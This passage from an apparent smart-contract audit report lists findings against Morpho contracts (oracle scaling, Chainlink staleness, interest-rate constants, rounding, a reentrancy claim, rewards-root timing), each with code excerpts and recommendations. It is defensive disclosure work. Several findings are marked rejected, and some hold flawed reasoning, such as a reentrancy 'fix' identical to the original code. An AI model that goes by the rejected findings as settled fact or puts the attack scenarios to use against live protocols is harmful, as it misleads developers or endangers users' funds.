 * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)
 */
function redeem(uint redeemTokens) override external returns (uint) {
}
```

This return value is not checked in `CompoundV2MigrationBundler.compoundV2Redeem`:

```
ICToken(cToken).redeem(amount);
```

While it currently always returns `NO_ERROR`, this is an implementation detail of the current contract code and the [cTokens are upgradeable](https://www.comp.xyz/t/managing-ctoken-versions/1220) which means it should be checked. Otherwise, user funds can be lost when the redeem silently fails with a non-zero error code and the cToken balance remains in the bundler. Anyone can then take the cTokens from the bundler.

**Recommendation**: Check that the return value of `redeem` is `0`.



### Submitting a newRoot does not remove the current root allowing users to potentially claim to many rewards	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [UniversalRewardsDistributor.sol#L80-L80](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L80-L80)

**Discription** 

When calling `UniversalRewardDistributor::submitRoot()` the account with the updater role submits a new root for the merkle tree to replace the current root. The replacement of the current root can only be finalized after a specific time lock period passes. One scenario for submitting a new root would be that the calculated rewards represented by the current root are too high.

The problem arises because during the time lock period for the newly submitted root, the old root is still active. This allows users to continue claiming their rewards based on the old root even if those rewards are too high, which was the reason for submitting a new root in the first place. This issue is made even worse by the fact that there is no way to remove tokens sent to the contract without changing the root. Therefor the account submitting the new root can not withdraw the tokens from the distributor contract, preventing them from been claimed.

Even though the owner can directly set a new root by calling `setRoot()`, the owner account is not always available or might be a multi sig that takes multiple signatures to execute a transaction which makes it unpractical for time sensitive transactions. That is why there are two different roles (`owner` and `updater`) in the first place. 

The result would be that users claim rewards that are higher that they should be. This will lead to substantial losses for the protocol, assuming they want to honour the rewards for all other users. 


**Recommendation**

When a new root is submitted consider setting the current root to 0 to prevent users from claiming rewards that are potentially too high 




### Calculating `SCALE_FACTOR` beforehand restricts the use-cases of `ChainlinkOracle.sol`	_(duplicate of [Oracle's `SCALE_FACTOR` can be zero for certain base, quote, and vault token combinations])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Context:**

- [ChainlinkOracle.sol](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol)
- [VaultLib.sol#L13-L17](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/VaultLib.sol#L13-L17)

**Description:**

`ChainlinkOracle.sol` pre-computes `SCALE_FACTOR` in its constructor, which includes the decimals of all price feeds:

```solidity
SCALE_FACTOR = 10
    ** (
        36 + quoteTokenDecimals + quoteFeed1.getDecimals() + quoteFeed2.getDecimals() - baseTokenDecimals
            - baseFeed1.getDecimals() - baseFeed2.getDecimals()
    ) / vaultConversionSample;
```

`SCALE_FACTOR` is used to scale up the conversion rate in `price()` to 36 decimals later on: 

```solidity
return SCALE_FACTOR.mulDiv(
    VAULT.getAssets(VAULT_CONVERSION_SAMPLE) * BASE_FEED_1.getPrice() * BASE_FEED_2.getPrice(),
    QUOTE_FEED_1.getPrice() * QUOTE_FEED_2.getPrice()
);
```

However, this implementation of calculating `SCALE_FACTOR` beforehand makes it impossible for `ChainlinkOracle` to be used for certain asset pairs if the decimals of `baseToken` and both base feeds are too large.

For example, to calculate the conversion rate from RETH to USD with `ChainlinkOracle`:
- The oracle would be configured as such:
  - `quoteTokenDecimals = 0`
  - `baseTokenDecimals = 18` since RETH has 18 decimals.
  - `quoteFeed1` and `quoteFeed2` would be `address(0)`
  - `baseFeed1` is [RETH / ETH](https://data.chain.link/ethereum/mainnet/crypto-eth/reth-eth), which has 18 decimals.
  - `baseFeed2` is [ETH / USD](https://data.chain.link/ethereum/mainnet/crypto-usd/eth-usd), which has 8 decimals.
- When calculating the decimals of `SCALE_FACTOR`:
  - `36 + 0 + 0 + 0 - 18 - 18 - 8 = -8`, which would underflow.

Therefore, it is not possible to use `ChainlinkOracle.sol` as an oracle for RETH / USD.
  
This will be a problem for all assets that only have ETH-pairs, since ETH / USD will be required as the second base feed to convert the price to USD. Additionally, all ETH-pairs have 18 decimals for their price feeds. Some other assets would be:
- cbETH, which only has a [cbETH / ETH](https://data.chain.link/ethereum/mainnet/crypto-eth/cbeth-eth) pair.
- FTM, which only has a [FTM / ETH](https://data.chain.link/ethereum/mainnet/crypto-eth/ftm-eth) pair.
- BADGER, which only has a [BADGER / ETH](https://data.chain.link/ethereum/mainnet/crypto-eth/badger-eth) pair.

Secondly, such an implementation implicitly restricts the maximum value of `vaultConversionSample`. For example: 
- Assume `ChainlinkOracle` is used for the conversion rate of RETH to USDC. 
- The oracle would be configured as such:
  - `quoteTokenDecimals = 6` since USDC has 6 decimals.
  - `baseTokenDecimals = 18` since RETH has 18 decimals.
  - `quoteFeed1` is [USDC / USD](https://data.chain.link/ethereum/mainnet/stablecoins/usdc-usd), which has 8 decimals.
  - `quoteFeed2` would be `address(0)`.
  - `baseFeed1` is [RETH / ETH](https://data.chain.link/ethereum/mainnet/crypto-eth/reth-eth), which has 18 decimals.
  - `baseFeed2` is [ETH / USD](https://data.chain.link/ethereum/mainnet/crypto-usd/eth-usd), which has 8 decimals.
- Calculating `SCALE_FACTOR` before dividing by `vaultConversionSample`:
  - `36 + 6 + 8 + 0 - 18 - 18 - 8 = 6`
- The numerator of `SCALE_FACTOR` is `1e6`.
- Therefore, `vaultConversionSample` cannot be larger than `1e6`, otherwise `SCALE_FACTOR` would round down to `0`.

This is problematic as `vaultConversionSample` is converted into shares using `convertToAssets()` when calculating the conversion rate in `price()`:

```solidity
function getAssets(IERC4626 vault, uint256 shares) internal view returns (uint256) {
    if (address(vault) == address(0)) return 1;

    return vault.convertToAssets(shares);
}
```

According to [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626), `convertToAssets()` **must** round down:

> **convertToAssets**  
> ...  
> MUST round down towards 0.

As such, if `vaultConversionSample` is smaller than the shares to assets ratio of the vault, `price()` will incorrectly return `0` as the conversion rate of RETH / USDC.

For example, consider a vault which starts with `1e7` virtual shares:

```solidity
uint256 internal constant VIRTUAL_SHARES = 1e7;
uint256 internal constant VIRTUAL_ASSETS = 1;

function convertToAssets(uint256 shares) external returns (uint256) {
    return shares.mulDivDown(totalAssets + VIRTUAL_ASSETS, totalShares + VIRTUAL_SHARES);
}
```

Since its shares to assets ratio is `1e7`, when `vaultConversionSample` is `1e6`, `convertToAssets()` would round down to `0`. This will also cause the calculation of RETH / USD in `price()` to become `0`.

Therefore, `ChainlinkOracle.sol` will be unusable for vaults with a shares to assets ratio larger than the implicit maximum value of `vaultConversionSample`.

**Recommendation:**

Consider using the decimals of each price feed during calculation in `price()`, rather than in the constructor, to prevent arithmetic underflow or `SCALE_FACTOR` rounding down to `0`.

Otherwise, consider documenting this limitation in `ChainlinkOracle.sol`.



### Chainlink's latestRoundData might return stale or incorrect results	_(duplicate of [Don't check chainlink's latestRoundData return stale or incorrect result])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
Chainlink's `latestRoundData` is used here to retrieve price feed data, however there is insufficient protection against price staleness.

Return arguments other than `int256 answer` are necessary to determine the validity of the returned price, as it is possible for an outdated price to be received. See [here](https://ethereum.stackexchange.com/questions/133242/how-future-resilient-is-a-chainlink-price-feed/133843#133843) for reasons why a price feed might stop updating.

The return value `updatedAt` contains the timestamp at which the received price was last updated, and can be used to ensure that the price is not outdated. See more information about `latestRoundID` in the [Chainlink docs](https://docs.chain.link/data-feeds/api-reference#latestrounddata). Inaccurate price data can lead to functions not working as expected and/or lost funds.

https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L20-L27
```solidity
    function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 1;

        (, int256 answer,,,) = feed.latestRoundData();
        require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);

        return uint256(answer);
    }
```

**Recommendation**:
Add a check for the `updatedAt` returned value from `latestRoundData`.
```diff
    function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 1;

-       (, int256 answer,,,) = feed.latestRoundData();
+       (, int256 answer, , uint256 balanceUpdatedAt,) = feed.latestRoundData();
+       require(block.timestamp - balanceUpdatedAt <= MAX_DELAY, "stale price");
        require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);

        return uint256(answer);
    }
```



### `MAX_RATE_AT_TARGET` is given as APR but Morpho Blue uses it as APY

**Severity:** Medium risk

**Context:** [ConstantsLib.sol#L9-L9](morpho-blue-irm/src/libraries/adaptive-curve/ConstantsLib.sol#L9-L9)

**Description**: Morpho Blue is compounding the interest, see [Morpho.sol#L477](https://cantina.xyz/ai/d86b7f95-e574-4092-8ea2-78dcac2f54f1/morpho-org-morpho-blue-f463e40/src/Morpho.sol#L477). The `MAX_RATE_AT_TARGET` specified here is given as a value that would result in an `1e7%` APR (annual percentage rate, non compounding). As Morpho Blue is compounding, this value must be given such that it results in an **APY** of `1e7%`. We need to compute it the same way as Morpho does as `e^{nx} - 1 = 0.01e9` where n = 365 days. Solving for [n*x = 16.1181](https://www.wolframalpha.com/input?i=e%5E%7By%7D+-+1+%3D+0.01e9%2C+solve+for+y). Therefore, `x = MAX_RATE_AT_TARGET = 16.1181 ether / 365 days`. The current value of `1e7 ether / 365 days` would lead to an actual Morpho Blue APY (yearly compounded interest rate) of [e^1e7 = 6.592232534618439×10^4342944](https://www.wolframalpha.com/input?i=e%5E%7B1e7%7D+-+1) which is a number with 4 million digits.
    If an IRM uses this rate, the market would become dysfunctional because of the [Morpho computation](https://cantina.xyz/ai/d86b7f95-e574-4092-8ea2-78dcac2f54f1/morpho-org-morpho-blue-f463e40/src/Morpho.sol#L477) overflowing already after [`exp(n*x) - 1 = 560`](https://www.wolframalpha.com/input?i=e%5E%7B0.01e9+%2F+%28365*86400%29+*+n%7D+-+1+%3D+2**256%2C+solve+for+n) seconds. Markets using this IRM will revert in the accrual code less than 10 minutes after the last market accrual. Users will be unable to withdraw their funds as `withdraw` and almost all other functions always perform a market accrual first. 

The likelihood is high because the max borrow rate can be reached by any IRM using the adaptive rebasing mechanism. Also, IRM borrow rates are supposed to be in range of not reverting by this code and not checked by a human when white-listing. The impact is high as all user funds in the pool will be locked due to the revert during accruing interest.

**Recommendation**: Consider using the correct APY values mentioned above.



### `MIN_RATE_AT_TARGET` is given as APR but Morpho Blue uses it as APY

**Severity:** Medium risk

**Context:** [ConstantsLib.sol#L12-L12](morpho-blue-irm/src/libraries/adaptive-curve/ConstantsLib.sol#L12-L12)

**Description**: Morpho Blue is compounding the interest, see [Morpho.sol#L477](https://cantina.xyz/ai/d86b7f95-e574-4092-8ea2-78dcac2f54f1/morpho-org-morpho-blue-f463e40/src/Morpho.sol#L477). The `MIN_RATE_AT_TARGET` specified here is given as a value that would result in an 0.1% APR (annual percentage rate, non compounding). As Morpho Blue is compounding, this value must be given such that it results in an **APY** of 0.1%. We need to compute it the same way as Morpho as `e^{nx} - 1 = 0.001` where n = 365 days. Solving for [n*x ≈ 0.0009995](https://www.wolframalpha.com/input?i=e%5E%7By%7D+-+1+%3D+0.001%2C+solve+for+y). Therefore, `x = MAX_RATE_AT_TARGET = 0.0009995 ether / 365 days`. The current value of `0.001 ether / 365 days` would lead to an actual Morpho blue APY (yearly compounded interest rate) of [e^{0.001} = 0.0010005 = 0.10005%](https://www.wolframalpha.com/input?i=e%5E%7B0.001%7D+-+1).

The desired lower bound of `0.1%` cannot be reached.

**Recommendation**: Consider using the correct APY values mentioned above.



### Reentrancy in deposit function MetaMorpho.sol	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

Reentrancy problem is a well known bug in smart contracts bassicaly consist an attacker taking control of the execution some way, allowing attacker to perform malicius actions if the state of the smart contract is inconsistent.

In the case of the metamorpho there is one case of this. let´s analize the deposit function:
```
 function deposit(uint256 assets, address receiver) public override returns (uint256 shares) {
        uint256 newTotalAssets = _accrueFee();

        // Update `lastTotalAssets` to avoid an inconsistent state in a re-entrant context.
        // It is updated again in `_deposit`.
        lastTotalAssets = newTotalAssets;

        shares = _convertToSharesWithTotals(assets, totalSupply(), newTotalAssets, Math.Rounding.Floor);

        _deposit(_msgSender(), receiver, assets, shares);
    }

 function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {
        super._deposit(caller, receiver, assets, shares);

        _supplyMorpho(assets);

        // `lastTotalAssets + assets` may be a little off from `totalAssets()`.
        _updateLastTotalAssets(lastTotalAssets + assets);
    }
```
[Link](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L559C4-L569C6) [Link](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L695C4-L702C6)

The vault standart (ERC4626) is protecting itself for reentrancy in case that the asset was a ERC777 or other "hook" tokens but the metamorpho contract dont, as you can see malicius user can reenter in the same deposit function and the  ` _supplyMorpho(assets);` and ` _updateLastTotalAssets(lastTotalAssets + assets);` is not already executed:

```
 function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {
        super._deposit(caller, receiver, assets, shares); <------- reenter happen here

        _supplyMorpho(assets); <------- not execute

        // `lastTotalAssets + assets` may be a little off from `totalAssets()`.
        _updateLastTotalAssets(lastTotalAssets + assets); <------- not execute
    }
```

- **Impact**
Despositors can get less assets due a malicius user can reenter in the desposit function and make mint more shares for the fee recepient that he should be.

- **Proof of concept**
If a malicius user call deposit function and reenter in the same deposit function the lastTotalAssets is not update with his deposit :

```
 function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {
        super._deposit(caller, receiver, assets, shares); <------- reenter happen here

        _supplyMorpho(assets); <------- not execute

        // `lastTotalAssets + assets` may be a little off from `totalAssets()`.
        _updateLastTotalAssets(lastTotalAssets + assets); <------- not execute
    }
```
When  a malicius user reenter the _accruedFeeShares function which is called at the beggining of the deposit function the totalInterest is going to be major, minting more shares that it should be for the feeRecipient.

```
 function _accruedFeeShares() internal view returns (uint256 feeShares, uint256 newTotalAssets) {
        newTotalAssets = totalAssets();

        uint256 totalInterest = newTotalAssets.zeroFloorSub(lastTotalAssets); <------- bad state
        if (totalInterest != 0 && fee != 0) {
            uint256 feeAssets = totalInterest.mulDiv(fee, WAD);
            // The fee assets is subtracted from the total assets in this calculation to compensate for the fact
            // that total assets is already increased by the total interest (including the fee assets).
            feeShares =
                _convertToSharesWithTotals(feeAssets, totalSupply(), newTotalAssets - feeAssets, Math.Rounding.Floor);
        }
    }
```

Minting more shares that it should be for the feeRecipient means less assets for the depositors.

- **Recomendation**
Consider firts update the lastTotalAssets:

```
 function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {
        super._deposit(caller, receiver, assets, shares);

        _supplyMorpho(assets);

        // `lastTotalAssets + assets` may be a little off from `totalAssets()`.
        _updateLastTotalAssets(lastTotalAssets + assets);
    }
```



### In `Metamorpho::setFeeRecipient()` shares for the outstanding fees are minted to the current, possibly compromised, feeRecipient	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L253-L253](metamorpho/src/MetaMorpho.sol#L253-L253)

**Discription** 

When setting a new `feeRecipient` in `Metamorpho::setFeeRecipient()`, the function `_accrueFee` is called. This function calculates the fees that accrued since the last fee accrual and mints the corresponding shares to the current `feeRecipient`.

Reasons for changing the `feeRecipient` in the first place can be the fact that the access to the current `feeRecipient` wallet was lost or that the wallet was hacked and is therefore compromised. If this is the case, by minting additional shares to the current `feeRecipient`, the loss for the protocol is only increasing and should therefore be avoided.   


**Recommendation**

Remove the call to `_updateLastTotalAssets(_accrueFee())` from the `setFeeRecipient()` function and  adding a new external `accrueFee()` function that can be called by anyone. This `accrueFee` function should just accrues the fees and updates the lastTotalAssets by calling `_updateLastTotalAssets(_accrueFee());`.

This way, if the old `feeRecipient` is supposed to get his final shares for the fees accrued until the update of the `feeRecipient`, the function `accrueFee()` can be called to send him the shares before calling `setFeeRecipient()`. If the access to the old `feeRecipient` is lost or the wallet was compromised, only `setFeeRecipient()` can be called without losing even more assets.




### Slippage check inadequate in erc4626Mint function	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

The ERC4626Bundler is designed to manage interactions with ERC4626 compliant tokens efficiently. In its `erc4626Mint` function, it calls the mint function of a vault to transfer assets and, in return, receives shares.

```javascript
File: src/ERC4626Bundler.sol
28:     function erc4626Mint(address vault, uint256 shares, uint256 maxAssets, address receiver)
29:         external
30:         payable
31:         protected
32:     {
33:         require(receiver != address(0), ErrorsLib.ZERO_ADDRESS);
34:         /// Do not check `receiver != address(this)` to allow the bundler to receive the vault's shares.
35: 
36:         shares = Math.min(shares, IERC4626(vault).maxMint(receiver));
37: 
38:         require(shares != 0, ErrorsLib.ZERO_SHARES);
39: 
40:         _approveMaxTo(IERC4626(vault).asset(), vault);
41: 
42:         uint256 assets = IERC4626(vault).mint(shares, receiver);
43:         require(assets <= maxAssets, ErrorsLib.SLIPPAGE_EXCEEDED);
44:     }
```

The potential issue is that the transaction getting frontrun or experiencing a sandwich attack. Normally, we've assumed the ERC4626 contract maintains a one-to-one relationship between asset and shares regardless of the supply, but the ERC4626 standard does not dictate how the pricing algorithm should work. For example, suppose we make the amount of shares issued a function of the square root of the assets deposited. In that case, whoever deposits first will get a larger amount of shares. This could encourage opportunistic traders to frontrun deposit orders and force the next buyer to pay a larger amount of the asset for the same amount of shares.

The defense against this is simple: the contract interacting with an ERC4626 should measure the amount of shares it received during a deposit (and assets during a withdraw) and revert if it does not receive the quantity expected within a certain slippage tolerance. This is a standard design pattern to deal with slippage issues.

As we can see in the code, at the end of the function, it has a slippage check to ensure that the assets sent to the vault is less than `maxAssets`. However, the `erc4626Mint` function does not check the number of `shares` that the bundler is going to receive. The only check is shares != 0.  

We can see that the shares argument is not the actual shares that the receiver will receive. The actual share number is the minimum of shares and vault max mint. So if the manipulating the max mint number can be maniplulate to be less than input shares, it can make the receiver receive less than the amount it should receive.

**Recommendation**:

To address this vulnerability, it's essential to enhance the slippage check by verifying the quantity of shares actually received against the expected minimum. This can be achieved by introducing a new check:

        require(receivedShares >= minExpectedShares, ErrorsLib.SLIPPAGE_EXCEEDED);




### Metamorpho.maxWithdraw() returns smaller value because of not accrued interest

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L848-L874](metamorpho/src/MetaMorpho.sol#L848-L874)

- Description
*Metamorpho.maxWithdraw()* is intended to return the maximum amount of assets that can be withdrawn by a given account. it calls _simulateWithdrawMorpho to simulate a withdraw. Any assets left after the simulation are deducted from the allowed amount, because they are not available.

Withdrawal simulation does not accrue interest like a real withdrawal. The accrued interest will not be included in the user's allowed amount. As a result, the user will not be able to withdraw his funds in the tx, even though it's expected. 


*Metamorpho.maxWithdraw()* is also used in ERC4262Bundler.sol. 

- Recommendation:
Consider accruing interest when simulating a withdrawal.



### Wrong rounding direction in `_maxDeposit`

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L651-L651](metamorpho/src/MetaMorpho.sol#L651-L651)

**Description**: The `_maxDeposit` should over-estimate the returned `totalSuppliable` assets, as otherwise, when over-estimating, a `deposit` using this `_maxDeposit` value might revert. This means `totalSuppliable` should round down, which means the `supplyCap.zeroFloorSub(supplyAssets)` term should round down, which means `supplyAssets` should round up.
However, `supplyAssets = MORPHO.expectedSupplyAssets(_marketParams(id), address(this))` is rounding down.

**Recommendation**: Consider simulating `MORPHO.expectedSupplyAssets(_marketParams(id), address(this))` but by rounding up.



### Wrong rounding direction for `toSupply` in `_supplyMorpho`

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L807-L807](metamorpho/src/MetaMorpho.sol#L807-L807)

**Description**: A property that a `_supplyMorpho` call should have is that immediately after the deposit, the supplied assets on the market from Metamorpho do not exceed Metamorpho's `supplyCap`. This means the `toSupply` computation should under-estimate the assets:

```solidity
(uint256 supplyAssets,,) = _accruedSupplyBalance(marketParams, id);
 uint256 toSupply = UtilsLib.min(supplyCap.zeroFloorSub(supplyAssets), assets);
```

This means the `supplyCap.zeroFloorSub(supplyAssets)` should round down, i.e., the `supplyAssets` should round up. However, `supplyAssets` are rounded down. A deposit on Metamorpho can end up immediately breaking its `supplyCap`s.

**Recommendation**: Consider simulating `_accruedSupplyBalance()` but by rounding up the final computation:

```solidity
assets = shares.toAssetsUp(market.totalSupplyAssets, market.totalSupplyShares);
```



### `MetaMorpho:: deposit()` does not work with fee-on-transfer tokens

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L559-L559](metamorpho/src/MetaMorpho.sol#L559-L559)

**Discription** 

MorphoBlue markets can have any token as a borrow token, also fee-on-demand tokens. 
If the asset of the vault is a fee-on-transfer token, calling `MetaMorpho:: deposit()` will always revert. This is because during the deposit process the tokens are first transferred to the vault. Since there is a fee for each transaction, the vault will receive less tokens than the amount of assets that should be deposited. The problem arises from the fact that the protocol then calls `_supplyMorpho()` with the initial amount of assets provided for the deposit and not the amount it received. Since the vault tries to invest more assets(initial amount of assets) than it has available (initial amount of assets – transaction fee), `_supplyingMorpho` will revert since it cannot invest assets it does not have.  


**Recommendation**

Check the balance of the asset held by the vault before calling `_supplyMorpho` and only invest the existing balance into morpho blue markets. Also make sure to modify the `_deposit` function to take into consideration the amount received by the vault when minting shares to the receiver. Alternatively state in the docs that fee-on-transfer tokens are not supported.  




### Anyone Can Create A MetaMorpho Vault, Which Can Lead To Malicious Owners Taking Advantage Of Their Rights	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Summary
In [metamorpho factory](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorphoFactory.sol#L43)  anyone is able to create a vault with an owner address of his choice and this owner address has all the power inside the vault to change every role and call any function. He can also change skim recipient to address owner by him and not a reward distribution contract.
- Details
Currently anyone can create a metamorpho vault, which would be considered trusted, because an event would be triggered and this vault will be saved to the original contract storage. https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorphoFactory.sol#L53-L57
If we want to have open and trustless system with all security measurements, I guess that end users would be able to choose from all available metamorpho vaults, which would be fetched from the [events](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorphoFactory.sol#L55), or the [mapping](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorphoFactory.sol#L22).
The problem arrises from fact that owner has too much power and it can be set to any regular address on vault creation.
Imagine the following scenario:
- Eve [creates](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorphoFactory.sol#L43) new metamorpho vault, because she likes the protocol and extend it for a token A, which don't have a vault still
- She set all roles (curator, allocators, etc) to trusted and well working addresses (persons) and the vault start to get liquidity fast
- Eve sees an opportunity to benefit from all the depositors and earn the interest of their funds, so she [set](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L204) the skim recipient to her address and waits.
- Users would eventually see that and start withdrawing their funds, but it may be too late
- Also Eve has all the power to [update withdraw queue](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L346C1-L346C1) and  [reallocate](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L397) their funds and temporary stuck the withdraw functionality 
- Also the protocol doesn't provide a functionality to remove an already created market in the [factory](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorphoFactory.sol#L22), which means that all compromised vaults will forever be treated by a valid metamorpho vaults.

- Recommendation
- One suggestion is to create some approval system when someone wants to open new metamorpho vault and assign only trusted owner. There could be other owner available to be set by the users, but with less rights on the metamorpho vaults.
- Implement functionality to stop compromised vault and safe user funds 



### Incompatibility With Rebasing/Deflationary/Inflationary tokens	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Details:

The current protocol does not seem to accommodate rebasing, deflationary, or inflationary tokens with balances that change during transfers or over time. Essential checks, including verification of token amounts transferred to contracts before and after actual transfers, are needed to deduce any fees or interest.

- Recommendations:

1. Ensure thorough checks for rebasing, inflation, or deflation by confirming that the previous and after balances equal the transfer amount.

2. Enhance contract support to handle such dynamic token behaviors before accepting user-supplied tokens.

3. Consider implementing additional checks on balances before and after transactions or explicitly inform users not to use tokens with deflationary, rebasing, or similar features if they wish to avoid potential loss.




### Loss of shares when reallocating assets.	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- **Description**:
Loss of shares when reallocating assets. During a `reallocation` assets are withdrawn from one market and supplied to another.

When `withdrawing` on morpho the amount of shares that are removed from the vaults position are rounded `UP`.
```solidity
function withdraw(
    MarketParams memory marketParams,
    uint256 assets,
    uint256 shares,
    address onBehalf,
    address receiver
) external returns (uint256, uint256) {
    ...
    if (assets > 0) shares = assets.toSharesUp(market[id].totalSupplyAssets, market[id].totalSupplyShares);
    ...
    position[id][onBehalf].supplyShares -= shares;
    ...
}
```

When `supplying` the assets the shares added to the vaults position are rounded `DOWN`.
```solidity
function supply(
    MarketParams memory marketParams,
    uint256 assets,
    uint256 shares,
    address onBehalf,
    bytes calldata data
) external returns (uint256, uint256) {
    ...
    if (assets > 0) shares = assets.toSharesDown(market[id].totalSupplyAssets, market[id].totalSupplyShares);
    ...
    position[id][onBehalf].supplyShares += shares;
    ...
}
```

So in case where the allocator reallocates the assets from one market to another, there is a loss of shares as you have to withdraw `MORE` shares than you receive when you supply assets due to different roundings. Although this loss is small it can cause issues when the vaults position on the market wants to be emptied by the users. The reallocate function does not account for this loss of share precision.

```solidity
function reallocate(MarketAllocation[] calldata allocations) external onlyAllocatorRole {
    uint256 totalSupplied;
    uint256 totalWithdrawn;
    for (uint256 i; i < allocations.length; ++i) {
        MarketAllocation memory allocation = allocations[i];
        Id id = allocation.marketParams.id();

        (uint256 supplyAssets, uint256 supplyShares,) = _accruedSupplyBalance(allocation.marketParams, id);
        uint256 withdrawn = supplyAssets.zeroFloorSub(allocation.assets);

        if (withdrawn > 0) {
            if (allocation.marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);

            // Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market.
            uint256 shares;
            if (allocation.assets == 0) {
                shares = supplyShares;
                withdrawn = 0;
            }

            (uint256 withdrawnAssets, uint256 withdrawnShares) =
                MORPHO.withdraw(allocation.marketParams, withdrawn, shares, address(this), address(this));

            emit EventsLib.ReallocateWithdraw(_msgSender(), id, withdrawnAssets, withdrawnShares);

            totalWithdrawn += withdrawnAssets;
        } else {
            uint256 suppliedAssets = allocation.assets == type(uint256).max
                ? totalWithdrawn.zeroFloorSub(totalSupplied)
                : allocation.assets.zeroFloorSub(supplyAssets);

            if (suppliedAssets == 0) continue;

            uint256 supplyCap = config[id].cap;
            if (supplyCap == 0) revert ErrorsLib.UnauthorizedMarket(id);

            if (supplyAssets + suppliedAssets > supplyCap) revert ErrorsLib.SupplyCapExceeded(id);

            // The market's loan asset is guaranteed to be the vault's asset because it has a non-zero supply cap.
            (, uint256 suppliedShares) =
                MORPHO.supply(allocation.marketParams, suppliedAssets, 0, address(this), hex"");

            emit EventsLib.ReallocateSupply(_msgSender(), id, suppliedAssets, suppliedShares);

            totalSupplied += suppliedAssets;
        }
    }

    if (totalWithdrawn != totalSupplied) revert ErrorsLib.InconsistentReallocation();
}
```
- **Recommendation**:
Consider checking the difference between the `withdrawnShares` and the `suppliedShares` when `reallocating` to account for such differences.



### Morpho bundler will always revert whenever a non-null ETH value is passed when delegate calling it's functions 	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
The issue is that MORPHO is built in a way that it doesn't support ETH.

Most of MORPHO's functions that receive funds lack the payable Keyword, this will always cause the morpho bundler external functions to revert whenever a non-null ETH value is passed.

Whenever a non-null Eth value is passed when calling these functions in MorphoBundler.sol they'll revert:

- morphoSupply(),
- morphoSupplyCollateral()
- morphoRepay() 



**Recommendation**:

Rebuild MORPHO to support ETH.



### `UniversalRewardsDistributor.claim` : users will not be able to redeem their full rewards with the same token distribution	_(duplicate of [Issue on `claim` mechanism can lead to incomplete or failed claims])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- `claim` function is intended to be called by users to claim their rewards set by the URD contract owner, and for each new rewards tokens to be distributed; the owner must set a new `root` for distributions.

- Afte the new `root` is set, users can claim their rewards by calling `claim` with the merkle proof that validates their claim:

  ```solidity
      function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
          external
          returns (uint256 amount)
      {
          require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);
          require(
              MerkleProof.verifyCalldata(
                  proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
              ),
              ErrorsLib.INVALID_PROOF_OR_EXPIRED
          );

          require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);

          amount = claimable - claimed[account][reward];

          claimed[account][reward] = claimable;

          ERC20(reward).safeTransfer(account, amount);

          emit EventsLib.Claimed(account, reward, amount);
      }
  ```

- As can be seen; the claimable amount is checked if it's `> claimed[account][reward]`, then the difference between `claimable - claimed[account][reward]` is sent to the account and the `claimed[account][reward] = claimable` is updated to prevent user from claiming twice from the same reward distribution .

- Impact

- If the owner decides to distribute the same reward token again with a new distribution; then one of the following scenarios might happen:

